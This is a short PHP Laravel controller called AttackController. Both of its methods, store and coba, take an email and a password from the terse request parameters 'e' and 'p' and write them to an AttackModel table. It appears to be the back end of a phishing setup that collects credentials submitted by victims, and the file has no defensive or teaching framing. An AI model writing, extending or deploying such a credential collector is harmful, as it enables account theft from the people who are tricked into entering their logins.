<?php

namespace App\Http\Controllers;

use App\Models\AttackModel;
use Illuminate\Http\Request;

class AttackController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    public function store(Request $request)
    {
        $email = $request->e;
        $password = $request->p;
        AttackModel::create([
            'email' => $email,
            'password' => $password
        ]);
    }

    public function coba(Request $request)
    {
        $email = $request->e;
        $password = $request->p;
        AttackModel::create([
            'email' => $email,
            'password' => $password
        ]);
    }
}
